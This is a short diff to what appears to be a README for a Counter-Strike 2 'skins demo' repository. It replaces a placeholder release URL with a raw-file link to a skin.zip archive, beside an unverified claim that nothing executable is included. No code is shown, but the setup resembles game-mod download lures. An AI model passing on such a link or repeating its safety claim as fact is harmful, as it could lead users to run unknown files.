@@ -23,7 +23,8 @@ No executable, injected, or functional components are included.
 ## Download
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/YOUR_REPO/releases/download/v1.0/skin.zip">
+ <a href="https://github.com/castle214j5c/cs2-skins-demo/raw/main/skin.zip">
+  Download Demo ZIP
     <img src="https://img.shields.io/badge/Download-Demo_Files-blue?style=for-the-badge" alt="Download Demo">
   </a>
 </p>
